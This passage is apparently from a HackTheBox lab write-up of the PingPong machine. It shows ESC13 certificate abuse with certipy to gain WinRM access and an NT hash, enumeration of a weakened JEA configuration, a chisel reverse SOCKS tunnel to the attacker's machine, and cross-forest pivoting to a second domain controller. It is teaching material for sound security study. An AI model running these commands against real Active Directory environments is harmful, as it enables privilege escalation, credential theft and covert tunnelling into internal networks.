![BloodHound Cypher query linking certificate templates to groups through issuance policies, showing TemporaryWinRM extended by the WinRM issuance policy, which links to the TempWinRMAccess group](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4f6eeac57972a0bf.png)

![BloodHound Cypher query linking certificate templates to groups through issuance policies, showing TemporaryWinRM extended by the WinRM issuance policy, which links to the TempWinRMAccess group](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-pingpong-4f6eeac57972.webp)

c.roberts is also in the IT group:

![BloodHound showing c.roberts as a member of the IT and Domain Users groups](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/91d5c4ae191bb44c.png)

![BloodHound showing c.roberts as a member of the IT and Domain Users groups](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-pingpong-91d5c4ae191b.webp)

There’s no obvious gain from that at this point.

#### DCs

Looking at the `ping.htb` domain object, there’s a `CrossForestTrust` edge to `pong.htb`:

![BloodHound CrossForestTrust edge from the ping.htb domain to the pong.htb domain](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/17e3929d65142377.png)

![BloodHound CrossForestTrust edge from the ping.htb domain to the pong.htb domain](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-pingpong-17e3929d6514.webp)

I can also see this with `netexec`:

```css
oxdf@hacky$ netexec ldap dc1.ping.htb -u C.Roberts -p AssumedBreach123 -k --dc-list
LDAP        dc1.ping.htb    389    DC1              [*] None (name:DC1) (domain:ping.htb) (signing:Unknown) (channel binding:Unknown) (NTLM:False)
LDAP        dc1.ping.htb    389    DC1              [+] ping.htb\C.Roberts:AssumedBreach123 
LDAP        dc1.ping.htb    389    DC1              dc1.ping.htb = 10.129.128.220
LDAP        dc1.ping.htb    389    DC1              [+] Found DC in trusted domain: dc2.pong.htb
LDAP        dc1.ping.htb    389    DC1              pong.htb -> Bidirectional -> Forest Transitive
LDAP        dc1.ping.htb    389    DC1              dc2.pong.htb = 192.168.2.2
```

That leaks the IP of `DC2.pong.htb`, 192.168.2.2.

Checking in BloodHound I don’t see many `pong.htb` objects:

![BloodHound search for pong returning only three unnamed pong.htb SIDs, the PONG$ trust account, and the PONG.HTB domain](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b9204bacdb0c5f93.png)

![BloodHound search for pong returning only three unnamed pong.htb SIDs, the PONG$ trust account, and the PONG.HTB domain](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-pingpong-b9204bacdb0c.webp)

That’s because I haven’t collected on that domain, just what references there are in `ping.htb`.

#### Writable Objects

I’ll use `bloodyAD` to check for writable objects:

```css
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache bloodyAD --host DC1.ping.htb -d ping.htb -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=ping,DC=htb
permission: WRITE

distinguishedName: CN=C.Roberts,CN=Users,DC=ping,DC=htb
permission: WRITE

distinguishedName: DC=ping.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=ping,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.ping.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=ping,DC=htb
permission: CREATE_CHILD
```

These are the default four objects for a domain user:

-   `CN=S-1-5-11,CN=ForeignSecurityPrincipals`: `S-1-5-11` is Authenticated Users. `bloodyAD` reports this object as writable on almost every domain.
-   `CN=C.Roberts,CN=Users`: By default, users can edit some attributes on their own account (personal information, phone numbers and similar) through SELF permissions.
-   The `ping.htb` and `_msdcs.ping.htb` DNS zones (`CREATE_CHILD`): by default, any authenticated user can create new DNS records in AD-integrated zones. It’s the basis of ADIDNS spoofing or relay tricks, but it isn’t a misconfiguration specific to this box.

## Shell as c.roberts on DC1

### ESC13

#### Background

The [Certipy Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc13-issuance-policy-with-privileged-group-linked) describes ESC13 as:

> ESC13 describes a privilege escalation scenario where a certificate template is configured with an “Issuance Policy” that, through an OID configuration in Active Directory, is linked to a specific AD security group. If an attacker can enroll for such a template, the certificate they obtain can effectively grant them the privileges associated with that linked AD group during Kerberos authentication.

ESC13 was [published](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/) by SpecterOps in early 2024. It abuses a legitimate Windows feature called Authentication Mechanism Assurance (AMA). AMA is meant to give users extra access only when they log in with a smart card or certificate, and not when they log in with a password.

There are three pieces that make this work:

-   Issuance policy: A certificate template can list one or more issuance policies, each identified by an OID. Every certificate issued from that template carries those OIDs in its Certificate Policies extension.
-   OID group link: Each issuance policy is an object in AD under `CN=OID,CN=Public Key Services,CN=Services,CN=Configuration`. Its `msDS-OIDToGroupLink` attribute can point to a group. AD requires that group to be a universal group with no members.
-   PKINIT: When a user authenticates to Kerberos with a certificate, the KDC checks the certificate’s issuance policies, follows any group links, and adds those group SIDs to the PAC in the TGT it issues.

The user’s account never changes. They aren’t added to the group, their `memberOf` stays the same, and BloodHound shows the group as empty. The group only exists in tickets obtained with the certificate. If the linked group has interesting rights, anyone who can enroll in the template gets those rights.

#### Request

So c.roberts can request a certificate from TemporaryWinRM, use it to get a TGT, and that TGT will include the TempWinRMAccess group. What that group grants isn’t visible from here, but given the name of the group, it’s reasonable to try WinRM access.

To abuse ESC13 I just need to enroll in the template using the `certipy req` command. My initial attempt fails:

```
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache certipy req -k -target dc1.ping.htb -dc-host dc1.ping.htb -ns 10.129.128.220 -ca ping-DC1-CA -template TemporaryWinRM
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Error during Kerberos authentication: [Errno Connection error (192.168.2.1:88)] [Errno 110] Connection timed out
[-] Got error: [Errno Connection error (192.168.2.1:88)] [Errno 110] Connection timed out
[-] Use -debug to print a stacktrace
```

If I run with `-debug` it shows what’s happening:

```sql
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache certipy req -k -target dc1.ping.htb -dc-host dc1.ping.htb -ns 10.129.128.220 -ca ping-DC1-CA -template TemporaryWinRM -debug
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[+] Domain retrieved from CCache: PING.HTB
[+] Username retrieved from CCache: c.roberts
[+] Nameserver: '10.129.128.220'
[+] DC IP: None
[+] DC Host: 'dc1.ping.htb'
[+] Target IP: None
[+] Remote Name: 'dc1.ping.htb'
[+] Domain: 'PING.HTB'
[+] Username: 'C.ROBERTS'
[+] Trying to resolve 'dc1.ping.htb' at '10.129.128.220'
[+] Resolved 'dc1.ping.htb' from cache: 192.168.2.1
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Checking for Kerberos ticket cache
[+] Loaded Kerberos cache from c.roberts.ccache
[+] Using HOST ticket from cache
[+] Username retrieved from CCache credential: c.roberts
[+] Using existing TGS for 'c.roberts'@'PING.HTB' for 'HOST' service
[+] Trying to connect to endpoint: ncacn_np:192.168.2.1[\pipe\cert]
[!] Failed to connect to endpoint ncacn_np:192.168.2.1[\pipe\cert]: [Errno Connection error (192.168.2.1:445)] timed out
Traceback (most recent call last):
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/impacket/nmb.py", line 905, in _setup_connection
    sock.connect(sa)
    ~~~~~~~~~~~~^^^^
TimeoutError: timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/certipy/lib/rpc.py", line 219, in _try_binding
    dce.connect()
    ~~~~~~~~~~~^^
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
    return self._transport.connect()
           ~~~~~~~~~~~~~~~~~~~~~~~^^
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/impacket/dcerpc/v5/transport.py", line 517, in connect
    self.setup_smb_connection()
    ~~~~~~~~~~~~~~~~~~~~~~~~~^^
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/impacket/dcerpc/v5/transport.py", line 509, in setup_smb_connection
    self.__smb_connection = SMBConnection(self.getRemoteName(), self.getRemoteHost(), sess_port=self.get_dport(),
                            ~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                          preferredDialect=self.__prefDialect, timeout=self.get_connect_timeout())
                                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/impacket/smbconnection.py", line 93, in __init__
    self.negotiateSession(preferredDialect)
    ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/impacket/smbconnection.py", line 134, in negotiateSession
    packet = self.negotiateSessionWildcard(self._myName, self._remoteName, self._remoteHost, self._sess_port,
                                           self._timeout, True, flags1=flags1, flags2=flags2, data=negoData)
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/impacket/smbconnection.py", line 183, in negotiateSessionWildcard
    self._nmbSession = nmb.NetBIOSTCPSession(myName, remoteName, remoteHost, nmb.TYPE_SERVER, sess_port,
                       ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                             timeout)
                                             ^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/impacket/nmb.py", line 896, in __init__
    NetBIOSSession.__init__(self, myname, remote_name, remote_host, remote_type=remote_type, sess_port=sess_port,
    ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                            timeout=timeout, local_type=local_type, sock=sock)
                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/impacket/nmb.py", line 756, in __init__
    self._sock = self._setup_connection((remote_host, sess_port), timeout)
                 ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/impacket/nmb.py", line 908, in _setup_connection
    raise socket.error("Connection error (%s:%s)" % (peer[0], peer[1]), e)
OSError: [Errno Connection error (192.168.2.1:445)] timed out
[+] Trying to resolve dynamic endpoint 91AE6020-9E3C-11CF-8D7C-00AA00C091BE
[!] Failed to connect to endpoint mapper: Could not connect: timed out
Traceback (most recent call last):
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/impacket/dcerpc/v5/transport.py", line 354, in connect
    self.__socket.connect(sa)
    ~~~~~~~~~~~~~~~~~~~~~^^^^
TimeoutError: timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/certipy/lib/rpc.py", line 166, in get_dynamic_endpoint
    dce.connect()
    ~~~~~~~~~~~^^
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1359, in connect
    return self._transport.connect()
           ~~~~~~~~~~~~~~~~~~~~~~~^^
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/impacket/dcerpc/v5/transport.py", line 357, in connect
    raise DCERPCException("Could not connect: %s" % msg)
impacket.dcerpc.v5.rpcrt.DCERPCException: Could not connect: timed out
[-] Failed to get dynamic TCP endpoint for 91AE6020-9E3C-11CF-8D7C-00AA00C091BE
[-] Got error: Failed to get DCE RPC connection
Traceback (most recent call last):
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/certipy/entry.py", line 67, in main
    actions[options.action](options)
    ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/certipy/commands/parsers/req.py", line 29, in entry
    req.entry(options)
    ~~~~~~~~~^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/certipy/commands/req.py", line 62, in entry
    _ = request.request()
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/certipy/lib/req.py", line 1515, in request
    cert = self.interface.request(csr_der, attributes)
  File "/home/oxdf/.local/share/uv/tools/certipy-ad/lib/python3.13/site-packages/certipy/lib/req.py", line 1039, in request
    raise Exception("Failed to get DCE RPC connection")
Exception: Failed to get DCE RPC connection
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

I am telling `certipy` that the name server is DC1, and then that name server is resolving DC1 to 192.168.2.1. This host must be dual-homed, and that internal IP comes back first. I can validate that theory:

```
oxdf@hacky$ dig +short dc1.ping.htb @10.129.128.220
192.168.2.1
10.129.128.220
oxdf@hacky$ dig +short dc1.ping.htb @10.129.128.220
10.129.128.220
192.168.2.1
```

It actually seems to alternate.

```bash
oxdf@hacky$ for i in $(seq 1 100); do dig +short dc1.ping.htb @10.129.128.220 | paste -sd, -; done | sort | uniq -c
     50 10.129.128.220,192.168.2.1
     50 192.168.2.1,10.129.128.220
```

This IP is consistent with the idea that there are Hyper-V VMs running on this machine, likely on the 192.168.2.0/24 network.

Anyway, the solution is to drop the name server argument from `certipy` and give the `-dc-ip` explicitly. Without `-ns`, `certipy` uses the system resolver, which reads `dc1.ping.htb` from my `/etc/hosts` entry:

```kotlin
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache certipy req -k -target dc1.ping.htb -dc-host dc1.ping.htb -dc-ip 10.129.128.220 -ca ping-DC1-CA -template TemporaryWinRM
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 20
[*] Successfully requested certificate
[*] Got certificate with UPN 'C.Roberts@ping.htb'
[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-2617'
[*] Saving certificate and private key to 'c.roberts.pfx'
[*] Wrote certificate and private key to 'c.roberts.pfx'
```

This certificate has the issuance policy stamped on it. Now I use that certificate to authenticate:

```css
oxdf@hacky$ certipy auth -pfx c.roberts.pfx -dc-ip 10.129.128.220
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'C.Roberts@ping.htb'
[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-2617'
[*] Using principal: 'c.roberts@ping.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'c.roberts.ccache'
File 'c.roberts.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'c.roberts.ccache'
[*] Trying to retrieve NT hash for 'c.roberts'
[*] Got hash for 'c.roberts@ping.htb': aad3b435b51404eeaad3b435b51404ee:2475be69d40e815588a85fd89c7a439d
```

This returns the NT hash for the account and a new TGT with the added group. That hash matches the password I already know:

```
oxdf@hacky$ echo -n 'AssumedBreach123' | iconv -t UTF-16LE | openssl dgst -md4 -provider legacy -provider default
MD4(stdin)= 2475be69d40e815588a85fd89c7a439d
```

### WinRM

With a TGT obtained through the `TemporaryWinRM` certificate, which now carries the TempWinRMAccess group, I can get a shell using `evil-winrm-py`:

```rust
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache evil-winrm-py -i dc1.ping.htb -k
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'dc1.ping.htb:5985' as 'c.roberts@PING.HTB'
evil-winrm-py PS C:\Users\C.Roberts\Documents>
```

This user is in the TempWinRMAccess group in this session:

```sql
evil-winrm-py PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes                                        
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
PING\TempWinRMAccess                        Group            S-1-5-21-750635624-2058721901-1932338391-2602 Mandatory group, Enabled by default, Enabled group
PING\IT                                     Group            S-1-5-21-750635624-2058721901-1932338391-2618 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization Certificate  Well-known group S-1-5-65-1                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

The IT group is also there. Authentication authority asserted identity and This Organization Certificate show the session came from a certificate login. Remote Management Users isn’t listed, which supports the idea that WinRM access is granted directly to the group’s SID.

## Shell as Pong_gMSA$ on DC1

### DC1 Enumeration

The DC file system is pretty empty, and so is c.roberts’s home directory:

```sql
evil-winrm-py PS C:\Users\C.Roberts> tree /f .
Folder PATH listing
Volume serial number is 000001E1 E721:DA81
C:\USERS\C.ROBERTS
+---Desktop
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Videos
```

The other users with home directories are the expected `Administrator` and `Public`, as well as `Pong_gMSA$`:

```
evil-winrm-py PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/16/2026   9:15 PM                Administrator
d-----        11/13/2026  12:14 PM                C.Roberts
d-----         4/11/2026   6:41 AM                Pong_gMSA$
d-r---         6/15/2025  12:59 PM                Public  
```

There are no interesting files or directories at the root of `C:`:

```sql
evil-winrm-py PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/16/2025   6:55 AM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         1/16/2026   6:11 AM                Program Files
d-----         1/16/2026   6:15 AM                Program Files (x86)
d-r---        11/13/2026  12:14 PM                Users
d-----         4/10/2026   7:03 PM                Windows
```

I don’t see any interesting directories in `Program Files (x86)`. `Program Files` has two worth mentioning:

```sql
evil-winrm-py PS C:\Program Files> ls

    Directory: C:\Program Files

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/16/2025   4:05 AM                Common Files
d-----         4/10/2026   4:43 AM                Hyper-V
d-----         6/16/2025   6:55 AM                Internet Explorer
d-----         1/16/2026   6:15 AM                Microsoft SQL Server
d-----          5/8/2021   1:20 AM                ModifiableWindowsApps
d-----         6/16/2025   4:05 AM                VMware
d-----         6/16/2025   4:55 AM                Windows Defender
d-----         4/10/2026   4:43 AM                Windows Defender Advanced Threat Protection
d-----         6/16/2025   6:55 AM                Windows Mail
d-----         6/16/2025   6:55 AM                Windows Media Player
d-----          5/8/2021   2:35 AM                Windows NT
d-----         6/16/2025   6:55 AM                Windows Photo Viewer
d-----          5/8/2021   1:34 AM                WindowsPowerShell   
```

Hyper-V shows the role is installed, which fits with the VMs I’ve already seen evidence of. SQL Server is interesting, as I didn’t see 1433 in my `nmap` scan. In the folder is just `160`, which is the shared components folder for SQL Server 2022 version 16.0. Checking `160\Setup Bootstrap\Log\Summary.txt` shows that someone started the MSSQL installer but then canceled it.

There is an interesting `JEA` directory in `C:\ProgramData`:

```
evil-winrm-py PS C:\programdata\JEA> ls

    Directory: C:\programdata\JEA

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          2/5/2026   5:39 AM            477 JEA.pssc  
```

It contains a Just Enough Administration (JEA) configuration (I’ve looked at JEA before in [HTB: Reel2](https://0xdf.gitlab.io/2021/03/13/htb-reel2.html)):

```powershell
@{

# Version number of the schema used for this document
SchemaVersion = '2.0.0.0'

# ID used to uniquely identify this document
GUID = 'e26939b6-819a-496e-be9a-dfb45427c765'

# ConfigurationName = 'restricted'

# Author of this document
 = 'Administrator'

# Session type defaults to apply for this session configuration. Can be 'RestrictedRemoteServer' (recommended), 'Empty', or 'Default'
SessionType = 'RestrictedRemoteServer'
LanguageMode = 'ConstrainedLanguage'
}
```

The configuration shows:

-   `SessionType = 'RestrictedRemoteServer'` - the JEA lockdown mode
-   `LanguageMode = 'ConstrainedLanguage'` - no arbitrary.NET, limited cmdlets
-   `ConfigurationName = 'restricted'` - this is commented out, but still likely refers to the registered endpoint name

A `RestrictedRemoteServer` session defaults to `NoLanguage`, so this config explicitly overrides that default to `ConstrainedLanguage`. That’s generally considered bad practice, as it weakens JEA. JEA relies on `NoLanguage` to stop users from writing script blocks. I’ll show how script blocks break out of this session [below](#script-blocks).

### DC2 Enumeration

#### Tunnel

I’ll get the [latest release](https://github.com/jpillora/chisel/releases/tag/v1.13.0) of the Windows Chisel binary and upload it to PingPong over my WinRM shell:

```
evil-winrm-py PS C:\ProgramData> upload /opt/chisel/chisel_1.13.0_windows_amd64.exe c.exe
Uploading /opt/chisel/chisel_1.13.0_windows_amd64.exe: 11.5MB [00:14, 849kB/s]                                                         
[+] File uploaded successfully as: C:\ProgramData\c.exe
```

I’ll start the server on my VM and run the client on PingPong with `.\c.exe client 10.10.15.169:8000 R:socks` to create a SOCKS proxy. At my server it shows the connection:

```css
oxdf@hacky$ chisel server --port 8000 --reverse
2026/11/14 21:22:34 server: Reverse tunnelling enabled
2026/11/14 21:22:34 server: Fingerprint Xc6r7jRM1D/pYOaRpWl1ivT1Bhq5DXdtGb6Bm2kKdug=
2026/11/14 21:22:34 server: Listening on http://0.0.0.0:8000
2026/11/14 21:23:08 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Now I can connect to DC2:

```css
oxdf@hacky$ proxychains netexec smb 192.168.2.2
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.2.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.2.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.2.2:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.2.2:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.2.2:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.2.2:135  ...  OK
SMB         192.168.2.2     445    DC2              [*]  x64 (name:DC2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
```

I’ll generate an entry for the `hosts` file:

```swift
oxdf@hacky$ proxychains netexec smb 192.168.2.2 --generate-hosts-file hosts-dc2
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.2.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.2.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.2.2:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.2.2:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.2.2:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.2.2:135  ...  OK
SMB         192.168.2.2     445    DC2              [*]  x64 (name:DC2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
oxdf@hacky$ cat hosts-dc2 
192.168.2.2     DC2.pong.htb pong.htb DC2
oxdf@hacky$ cat hosts-dc2 /etc/hosts | sudo sponge /etc/hosts
```

Now I can connect by hostname:

```css
oxdf@hacky$ proxychains -q netexec smb dc2.pong.htb
SMB         224.0.0.1       445    DC2              [*]  x64 (name:DC2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
```

#### Domain Trusts

I observed [above](#dcs) the bidirectional domain trust between `ping.htb` and `pong.htb`. This means that I can authenticate to machines on `pong.htb` using the creds of a user on `ping.htb`. Just passing the username and password with `netexec` doesn’t work:

```css
oxdf@hacky$ proxychains -q netexec smb dc2.pong.htb -u c.roberts -p AssumedBreach123 -k
SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc2.pong.htb    445    dc2              [-] pong.htb\c.roberts:AssumedBreach123 KDC_ERR_C_PRINCIPAL_UNKNOWN 
```

It’s trying to find `pong\c.roberts`, and that user doesn’t exist. But I can use the `-d` flag, or just use the existing TGT:

```sql
oxdf@hacky$ KRB5CCNAME=c.roberts.ccache proxychains -q netexec smb dc2.pong.htb --use-kcache
SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc2.pong.htb    445    dc2              [+] PING.HTB\c.roberts from ccache 
oxdf@hacky$ proxychains -q netexec smb dc2.pong.htb -u c.roberts -p AssumedBreach123 -d ping.htb -k
SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc2.pong.htb    445    dc2              [+] ping.htb\c.roberts:AssumedBreach123 
```

`netexec` uses Impacket’s own Kerberos code, which doesn’t read `krb5.conf`, but tools built on the system Kerberos library (like `evil-winrm-py` and `kvno`) do. So I’ll also update the `krb5.conf` file, though `netexec` only generates a config for a single realm, and I need both, so I’ll do it manually (with some help from Claude):

```java
[libdefaults]
    default_realm = PING.HTB
    dns_lookup_kdc = false
    dns_lookup_realm = false
    dns_canonicalize_hostname = false
    rdns = false

[realms]
    PING.HTB = {
        kdc = dc1.ping.htb
        admin_server = dc1.ping.htb
        default_domain = ping.htb
    }
    PONG.HTB = {
        kdc = dc2.pong.htb
        admin_server = dc2.pong.htb
    }

[domain_realm]
    .ping.htb = PING.HTB
    ping.htb = PING.HTB
    .pong.htb = PONG.HTB
    pong.htb = PONG.HTB
```

The `PONG.HTB` entries are what make the cross-realm authentication work. When I request a ticket for a service on `dc2.pong.htb`, the `[domain_realm]` mappings tell the Kerberos library that host is in the `PONG.HTB` realm. The `ping.htb` KDC answers with a referral ticket for `PONG.HTB`, and since `dns_lookup_kdc` is off, the `[realms]` entry is how the client knows to take that referral to `dc2.pong.htb`.

I kept `dns_canonicalize_hostname = false` from [earlier](#initial-scanning) and added `rdns = false`. By default, the library resolves the hostname and reverse resolves the IP to build the service principal name. Everything here goes through `proxychains`, which hands back fake addresses (like the 224.0.0.1 in the `netexec` output above), so these settings make it use the hostname exactly as I give it.

#### SMB - TCP 445

The shares on DC2 also look default:

```sql
oxdf@hacky$ proxychains -q netexec smb dc2.pong.htb -u c.roberts -p AssumedBreach123 -d ping.htb -k --shares
SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc2.pong.htb    445    dc2              [+] ping.htb\c.roberts:AssumedBreach123 
SMB         dc2.pong.htb    445    dc2              [*] Enumerated shares
SMB         dc2.pong.htb    445    dc2              Share           Permissions            Remark
SMB         dc2.pong.htb    445    dc2              -----           -----------            ------
SMB         dc2.pong.htb    445    dc2              ADMIN$                                 Remote Admin
SMB         dc2.pong.htb    445    dc2              C$                                     Default share
SMB         dc2.pong.htb    445    dc2              IPC$            READ                   Remote IPC
SMB         dc2.pong.htb    445    dc2              NETLOGON        READ                   Logon server share 
SMB         dc2.pong.htb    445    dc2              SYSVOL          READ                   Logon server share 
```

Nothing to see here.

#### LDAP - TCP 389+

There’s no roasting, but there is a gMSA account:

```css
oxdf@hacky$ proxychains -q netexec ldap dc2.pong.htb -u c.roberts -p AssumedBreach123 -d ping.htb -k --gmsa
LDAP        dc2.pong.htb    389    DC2              [*] None (name:DC2) (domain:ping.htb) (signing:Unknown) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc2.pong.htb    389    DC2              [+] ping.htb\c.roberts:AssumedBreach123 
LDAP        dc2.pong.htb    389    DC2              [*] Getting GMSA Passwords
LDAP        dc2.pong.htb    389    DC2              Account: Pong_gMSA$           NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: gMSA Managers
```

c.roberts can’t read the password, but members of the gMSA Managers group can. That group is currently empty:

```css
oxdf@hacky$ proxychains -q netexec ldap dc2.pong.htb -u c.roberts -p AssumedBreach123 -d ping.htb -k --groups "gMSA Managers"
